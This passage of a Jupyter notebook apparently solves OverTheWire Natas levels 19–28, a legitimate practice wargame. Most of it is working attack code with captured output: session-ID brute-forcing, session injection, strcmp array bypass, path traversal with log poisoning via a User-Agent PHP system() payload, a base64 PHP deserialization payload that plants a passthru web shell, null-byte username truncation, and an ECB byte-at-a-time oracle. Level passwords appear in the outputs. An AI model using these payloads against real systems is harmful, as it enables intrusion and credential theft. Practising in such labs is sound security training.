     "output_type": "stream",
     "text": [
      "password found. session id: 285, key: 3238312d61646d696e\n",
      "1097\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas19\", \"pass\": \"tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr\" };</script></head>\n",
      "<body>\n",
      "<h1>natas19</h1>\n",
      "<div id=\"content\">\n",
      "<p>\n",
      "<b>\n",
      "This page uses mostly the same code as the previous level, but session IDs are no longer sequential...\n",
      "</b>\n",
      "</p>\n",
      "DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20\n",
      "Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "password found: fp5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\n",
      "testing session id 285, key: 3238322d61646d696e\n",
      "testing session id 285, key: 3238332d61646d696e\n",
      "testing session id 285, key: 3238352d61646d696e\n",
      "testing session id 285, key: 3238342d61646d696e\n"
     ]
    }
   ],
   "source": [
    "# natas19\n",
    "count = 19\n",
    "init()\n",
    "\n",
    "url = f\"http://natas19.natas.labs.overthewire.org/index.php?debug=1&username=admin&password=test\"\n",
    "i = -1\n",
    "\n",
    "\n",
    "def task():\n",
    "    global i\n",
    "    while \"natas20\" not in pwd:\n",
    "        i += 1\n",
    "        key = f\"{i}-admin\".encode(\"utf-8\").hex()\n",
    "        cookies = dict(PHPSESSID=key)\n",
    "        result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "        if \"Username: natas20\" in result.text:\n",
    "            clear_output()\n",
    "            print(f\"password found. session id: {i}, key: {key}\")\n",
    "            print(len(result.text))\n",
    "            print(result.text)\n",
    "            find_pwd(result)\n",
    "            break\n",
    "        print(f\"testing session id {i}, key: {key}\")\n",
    "\n",
    "\n",
    "run_task(task)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas20\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1361\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\" };</script></head>\n",
      "<body>\n",
      "<h1>natas20</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: MYREAD key<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to admin\n",
      "admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.\n",
      "<form action=\"index.php\" method=\"POST\">\n",
      "Your name: <input name=\"name\" value=\"admin\n",
      "admin 1\"><br>\n",
      "<input type=\"submit\" value=\"Change name\" />\n",
      "</form>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "DEBUG: MYWRITE key name|s:13:\"admin\n",
      "admin 1\";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_key<br>DEBUG: name => admin\n",
      "admin 1<br>\n",
      "password not found.\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\" };</script></head>\n",
      "<body>\n",
      "<h1>natas20</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: MYREAD key<br>DEBUG: Session file doesn't exist<br>DEBUG: Name set to admin\n",
      "admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.\n",
      "<form action=\"index.php\" method=\"POST\">\n",
      "Your name: <input name=\"name\" value=\"admin\n",
      "admin 1\"><br>\n",
      "<input type=\"submit\" value=\"Change name\" />\n",
      "</form>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "DEBUG: MYWRITE key name|s:13:\"admin\n",
      "admin 1\";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_key<br>DEBUG: name => admin\n",
      "admin 1<br>\n",
      "1527\n",
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\" };</script></head>\n",
      "<body>\n",
      "<h1>natas20</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: MYREAD key<br>DEBUG: Reading from /var/lib/php/sessions/mysess_key<br>DEBUG: Read [name admin]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>DEBUG: Name set to admin\n",
      "admin 1<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21\n",
      "Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH</pre>\n",
      "<form action=\"index.php\" method=\"POST\">\n",
      "Your name: <input name=\"name\" value=\"admin\n",
      "admin 1\"><br>\n",
      "<input type=\"submit\" value=\"Change name\" />\n",
      "</form>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "DEBUG: MYWRITE key name|s:13:\"admin\n",
      "admin 1\";admin|s:1:\"1\";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_key<br>DEBUG: admin => 1<br>DEBUG: name => admin\n",
      "admin 1<br>\n",
      "password found: fBPhv63cKE1lkQl04cE5CuFTzXe15NfiH\n"
     ]
    }
   ],
   "source": [
    "# natas20\n",
    "count = 20\n",
    "init()\n",
    "\n",
    "while \"natas21\" not in pwd:\n",
    "    url = f\"http://natas{count}.natas.labs.overthewire.org/index.php?debug=1\"\n",
    "    cookies = dict(PHPSESSID=\"key\")\n",
    "    params = dict(name=\"admin\\nadmin 1\")\n",
    "    result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies, params=params)\n",
    "    print(len(result.text))\n",
    "    print(result.text)\n",
    "    if find_pwd(result):\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas21\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas21\n",
    "count = 21\n",
    "init()\n",
    "\n",
    "url = f\"http://natas{count}-experimenter.natas.labs.overthewire.org/index.php?submit=1&admin=1&bgcolor=blue&debug=1\"\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "cookies = dict(PHPSESSID=res.cookies.get(\"PHPSESSID\"))\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/index.php\"\n",
    "result = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas22\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fdIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas22\n",
    "count = 22\n",
    "init()\n",
    "\n",
    "cookies = dict(PHPSESSID=\"1\")\n",
    "params = dict(revelio=1)\n",
    "result = requests.get(\n",
    "    url, auth=(natas, pwd[natas]), cookies=cookies, params=params, allow_redirects=False\n",
    ")\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas23\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fMeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas23\n",
    "count = 23\n",
    "init()\n",
    "\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/?passwd=11iloveyou\"\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas24\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/wechall-data.js\"></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas24\", \"pass\": \"MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd\" };</script></head>\n",
      "<body>\n",
      "<h1>natas24</h1>\n",
      "<div id=\"content\">\n",
      "\n",
      "Password:\n",
      "<form name=\"input\" method=\"get\">\n",
      "    <input type=\"text\" name=\"passwd\" size=20>\n",
      "    <input type=\"submit\" value=\"Login\">\n",
      "</form>\n",
      "\n",
      "<br />\n",
      "<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />\n",
      "<br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>  \n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "password found: fckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas24\n",
    "count = 24\n",
    "init()\n",
    "\n",
    "passwd = \"\"\n",
    "\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org?passwd[]={passwd}\"\n",
    "result = requests.get(url, auth=(natas, pwd[natas]))\n",
    "print(result.text)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas25\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fcVXXwxMS3Y26n5UZU89QgpGmWCelaQlE\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas25\n",
    "count = 25\n",
    "init()\n",
    "\n",
    "res = requests.get(url, auth=auth)\n",
    "cookies = res.cookies.get_dict()\n",
    "\n",
    "lang = f'....//....//....//....//....//var/www/natas/natas25/logs/natas25_{cookies[\"PHPSESSID\"]}.log'\n",
    "\n",
    "params = dict(lang=lang)\n",
    "header = {\"User-Agent\": '<?php system(\"cat /etc/natas_webpass/natas26\"); ?>'}\n",
    "result = requests.get(\n",
    "    url, auth=(natas, pwd[natas]), params=params, headers=header, cookies=cookies\n",
    ")\n",
    "# print(result.text)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas26\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/wechall-data.js\"></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas26\", \"pass\": \"cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE\" };</script></head>\n",
      "<body>\n",
      "\n",
      "<h1>natas26</h1>\n",
      "<div id=\"content\">\n",
      "\n",
      "Draw a line:<br>\n",
      "<form name=\"input\" method=\"get\">\n",
      "X1<input type=\"text\" name=\"x1\" size=2>\n",
      "Y1<input type=\"text\" name=\"y1\" size=2>\n",
      "X2<input type=\"text\" name=\"x2\" size=2>\n",
      "Y2<input type=\"text\" name=\"y2\" size=2>\n",
      "<input type=\"submit\" value=\"DRAW!\">\n",
      "</form>\n",
      "\n",
      "<img src=\"img/natas26_a0e61oj9sp713jau8h8uk40bt1.png\"><br />\n",
      "<b>Fatal error</b>:  Uncaught Error: Cannot use object of type Logger as array in /var/www/natas/natas26/index.php:105\n",
      "Stack trace:\n",
      "#0 /var/www/natas/natas26/index.php(131): storeData()\n",
      "#1 {main}\n",
      "  thrown in <b>/var/www/natas/natas26/index.php</b> on line <b>105</b><br />\n",
      "\n",
      "password found: fu3RRffXjysjgwFU6b9xa23i6prmUsYne\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas26\n",
    "count = 26\n",
    "init()\n",
    "\n",
    "PHP_base64_encoded_payload = \"Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNjoiaW1nL2V4cGxvaXQxLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIyOiIjLS1zZXNzaW9uIHN0YXJ0ZWQtLSMKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTc6Ijw/cGhwIGVjaG8gcGFzc3RocnUoJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ==\"\n",
    "cookies = dict(drawing=PHP_base64_encoded_payload)\n",
    "res = requests.get(url, auth=auth, cookies=cookies)\n",
    "print(res.text)\n",
    "\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org/img/exploit1.php\"\n",
    "res = requests.get(url, auth=auth)\n",
    "find_pwd(res)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas27\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas27\n",
    "count = 27\n",
    "\n",
    "natas = f\"natas{count}\"\n",
    "init()\n",
    "\n",
    "# First request add a user, username is natas28 and password is empty\n",
    "url = f\"http://natas{count}.natas.labs.overthewire.org\"\n",
    "username = \"natas\" + \"\\00\" * 57 + \"28\" + \"1\"  # natas28\n",
    "password = \"\"\n",
    "params = dict(username=username, password=password)\n",
    "result = requests.get(url, auth=auth, params=params)\n",
    "\n",
    "# Second request get user with username is natas28 and password is empty\n",
    "username = \"natas28\"\n",
    "password = \"\"\n",
    "params = dict(username=username, password=password)\n",
    "result = requests.get(url, auth=auth, params=params)\n",
    "\n",
    "find_pwd(result)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Natas28\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# natas28\n",
    "count = 28\n",
    "init()\n",
    "\n",
    "test = {}\n",
    "\n",
    "query = \"\"\n",
    "param = {\"query\": query}\n",
    "res = requests.get(url, auth=auth, params=param)\n",
    "query2 = res.url.split(\"query=\")[1]\n",
    "test[query] = [\n",
    "    query2,\n",
    "    urllib.parse.unquote(query2),\n",
    "    base64.b64decode(urllib.parse.unquote(query2)),\n",
    "]\n",
    "\n",
    "# for i in range(0, 20):\n",
    "#     query = 'a' * 12 + 'a' * 16 * i\n",
    "#     param = {\"query\": query}\n",
    "#     res = requests.get(url, auth=auth, params=param)\n",
    "#     query2 = res.url.split('query=')[1]\n",
    "#     test[query] = [query2, urllib.parse.unquote(query2), base64.b64decode(urllib.parse.unquote(query2))]\n",
    "#     print(f'progress: {i}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "ename": "IndentationError",
     "evalue": "unexpected indent (715047400.py, line 58)",
     "output_type": "error",
     "traceback": [
      "\u001b[0;36m  Cell \u001b[0;32mIn[15], line 58\u001b[0;36m\u001b[0m\n\u001b[0;31m    for key, value in get_frequency_dic(text):\u001b[0m\n\u001b[0m    ^\u001b[0m\n\u001b[0;31mIndentationError\u001b[0m\u001b[0;31m:\u001b[0m unexpected indent\n"
     ]
    }
   ],
   "source": [
    "def get_score(bytes: bytes) -> float:\n",
    "    score_dic = {\n",
    "        \"E\": 11.16,\n",
    "        \"A\": 8.50,\n",
    "        \"R\": 7.58,\n",
    "        \"I\": 7.54,\n",
    "        \"O\": 7.16,\n",
    "        \"T\": 6.95,\n",
    "        \"N\": 6.65,\n",
    "        \"S\": 5.74,\n",
    "        \"L\": 5.49,\n",
    "        \"C\": 4.54,\n",
    "        \"U\": 3.63,\n",
    "        \"D\": 3.38,\n",
    "        \"P\": 3.17,\n",
    "        \"M\": 3.01,\n",
    "        \"H\": 3.00,\n",
    "        \"G\": 2.47,\n",
    "        \"B\": 2.07,\n",
    "        \"F\": 1.81,\n",
    "        \"Y\": 1.78,\n",
    "        \"W\": 1.29,\n",
    "        \"K\": 1.10,\n",
    "        \"V\": 1.01,\n",
    "        \"X\": 0.29,\n",
    "        \"Z\": 0.27,\n",
    "        \"J\": 0.20,\n",
    "        \"Q\": 0.20,\n",
    "        \"e\": 11.16,\n",
    "        \"a\": 8.50,\n",
    "        \"r\": 7.58,\n",
    "        \"i\": 7.54,\n",
    "        \"o\": 7.16,\n",
    "        \"t\": 6.95,\n",
    "        \"n\": 6.65,\n",
    "        \"s\": 5.74,\n",
    "        \"l\": 5.49,\n",
    "        \"c\": 4.54,\n",
    "        \"u\": 3.63,\n",
    "        \"d\": 3.38,\n",
    "        \"p\": 3.17,\n",
    "        \"m\": 3.01,\n",
    "        \"h\": 3.00,\n",
    "        \"g\": 2.47,\n",
    "        \"b\": 2.07,\n",
    "        \"f\": 1.81,\n",
    "        \"y\": 1.78,\n",
    "        \"w\": 1.29,\n",
    "        \"k\": 1.10,\n",
    "        \"v\": 1.01,\n",
    "        \"x\": 0.29,\n",
    "        \"z\": 0.27,\n",
    "        \"j\": 0.20,\n",
    "        \"q\": 0.20,\n",
    "        \" \": 18,\n",
    "    }\n",
    "    score = 0\n",
    "    for key, value in get_frequency_dic(text):\n",
    "        if key in score_dic:\n",
    "            score += score_dic[key] * value\n",
    "        elif key not in string.printable:\n",
    "            score = 0\n",
    "            break\n",
    "    return round(score, 2)\n",
    "\n",
    "\n",
    "def get_frequency_dic(bytes: bytes) -> dict:\n",
    "    fre_bytes = defaultdict(int)\n",
    "    for i in range(len(bytes)):\n",
    "        x = bytes[i]\n",
    "        fre_bytes[x] += 1\n",
    "    return sorted(fre_bytes.items(), key=lambda x: x[1], reverse=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      ": 0 80\n",
      "b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xe8\\x7f\\xf6\\x0c\\x99\\xadr\\xcc\\xbd\\x94~4\\x17\\xa9\\x01(\\xa7~\\x8e\\xd1\\xaa\\xbe\\x0b]\\x05\\xc4\\xff\\xe6\\xac\\x14#\\xabG\\x8e\\xb1\\xa1\\xfe&\\x1a,l\\x15\\x06\\x11\\t\\xb3\\xfe\\xda'\n"
     ]
    }
   ],
   "source": [
    "for query, urlList in test.items():\n",
    "    print(f\"{query}: {len(query)} {len(urlList[2])}\")\n",
    "    print(f\"{urlList[2]}\")\n",
    "# print(f'{query}: {base64.b64decode(url)}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "\"\"\"\n",
    "a * 16 : \\xb3\\x908\\xc2\\x8d\\xf7\\x9be\\xd2aQ\\xdfX\\xf7\\xea\\xa3\n",
    "\"\"\"\n",
    "\n",
    "header = b\"\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc0\\x87-\\xee\\x8b\\xc9\\x0b\\x11V\\x91;\\x08\\xa2#\\xa3\\x9e\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "progress: 0\n",
      "trying craft_input_dict. header: b'aaaaaaaaaaaaaaa' 15\n",
      "input_dict: 250\n",
      "output: b'%'\n",
      "current result: b'aaaaaaaaaaaaaaa%'\n",
      "progress: 1\n",
      "trying craft_input_dict. header: b'aaaaaaaaaaaaaa%' 15\n",
      "input_dict: 250\n",
      "not found.\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'%'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "block_size = 16\n",
    "\n",
    "global_input_dicts = []\n",
    "\n",
    "\n",
    "def new_oracle(plain_bytes: bytes) -> bytes:\n",
    "    header = b\"a\" * 10\n",
    "    param = {\"query\": header + plain_bytes}\n",
    "    try:\n",
    "        res = requests.get(url, auth=auth, params=param)\n",
    "        if res.status_code != 200:\n",
    "            print(f\"status code in new_oracle: {res.status_code}\")\n",
    "            return new_oracle(plain_bytes)\n",
    "    except:\n",
    "        print(\"error in new_oracle\")\n",
    "        return new_oracle(plain_bytes)\n",
    "    encrypted_b64 = res.url.split(\"query=\")[1]\n",
    "    encrypted_bytes = base64.b64decode(urllib.parse.unquote(encrypted_b64))\n",
    "    # print(len(header + plain_bytes), encrypted_bytes)\n",
    "    # print(encrypted_bytes[:48], encrypted_bytes[48:])\n",
    "    return encrypted_bytes[48 : 48 + block_size]\n",
    "\n",
    "\n",
    "def craft_input_dict(header: bytes) -> dict:\n",
    "    input_dict = {}\n",
    "    candidate_list = list(range(256))\n",
    "\n",
    "    def task():\n",
    "        while candidate_list:\n",
    "            i = candidate_list.pop()\n",
    "            encrypted_bytes = new_oracle(header + bytes([i]))\n",
    "            input_dict[encrypted_bytes] = bytes([i])\n",
    "\n",
    "    run_task(task, 10)\n",
    "\n",
    "    return input_dict\n",
    "\n",
    "\n",
    "def match_output():\n",
    "    global global_input_dicts\n",
    "    header = b\"a\" * (block_size - 1)\n",
    "    result = header\n",
    "\n",
    "    for i in range(block_size):\n",
    "        print(f\"progress: {i}\")\n",
    "        print(f\"trying craft_input_dict. header: {header} {len(header)}\")\n",
    "        input_dict = craft_input_dict(header)\n",
    "        global_input_dicts.append(input_dict)\n",
    "        print(f\"input_dict: {len(input_dict)}\")\n",
    "        encrypted_byte = new_oracle(b\"a\" * (block_size - 1 - i))\n",
    "        if encrypted_byte in input_dict:\n",
    "            output = input_dict[encrypted_byte]\n",
    "            print(f\"output: {output}\")\n",
    "        else:\n",
    "            print(\"not found.\")\n",
    "            return result[block_size - 1 :]\n",
    "        result += output\n",
    "        header = result[-block_size + 1 :]\n",
    "        print(f\"current result: {result}\")\n",
    "\n",
    "    return result\n",
    "\n",
    "\n",
    "# result = match_output()\n",
    "# print(result)\n",
    "\n",
    "\n",
    "match_output()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "dict_values([b'\\xfc', b'\\xfa', b'\\xfe', b'\\xf7', b'\\xfb', b'\\xff', b'\\xfd', b'\\xf9', b'\\xf6', b'\\xf8', b'\\xf5', b'\\xf4', b'\\xf3', b'\\xf2', b'\\xf0', b'\\xef', b'\\xf1', b'\\xed', b'\\xee', b'\\xec', b'\\xeb', b'\\xea', b'\\xe8', b'\\xe5', b'\\xe9', b'\\xe7', b'\\xe4', b'\\xe3', b'\\xe6', b'\\xe2', b'\\xe1', b'\\xe0', b'\\xde', b'\\xdd', b'\\xdf', b'\\xdc', b'\\xda', b'\\xd9', b'\\xdb', b'\\xd8', b'\\xd7', b'\\xd6', b'\\xd5', b'\\xd3', b'\\xd4', b'\\xd2', b'\\xd0', b'\\xcf', b'\\xd1', b'\\xce', b'\\xcd', b'\\xcc', b'\\xc9', b'\\xc8', b'\\xc7', b'\\xc5', b'\\xc6', b'\\xc4', b'\\xc3', b'\\xc2', b'\\xc1', b'\\xcb', b'\\xc0', b'\\xca', b'\\xbf', b'\\xbe', b'\\xbd', b'\\xbc', b'\\xbb', b'\\xba', b'\\xb9', b'\\xb8', b'\\xb7', b'\\xb6', b'\\xb5', b'\\xb4', b'\\xb3', b'\\xb2', b'\\xb1', b'\\xb0', b'\\xaf', b'\\xae', b'\\xad', b'\\xac', b'\\xab', b'\\xaa', b'\\xa9', b'\\xa8', b'\\xa7', b'\\xa6', b'\\xa5', b'\\xa4', b'\\xa3', b'\\xa2', b'\\xa1', b'\\xa0', b'\\x9f', b'\\x9e', b'\\x9d', b'\\x9c', b'\\x9b', b'\\x9a', b'\\x99', b'\\x97', b'\\x98', b'\\x96', b'\\x95', b'\\x94', b'\\x93', b'\\x92', b'\\x91', 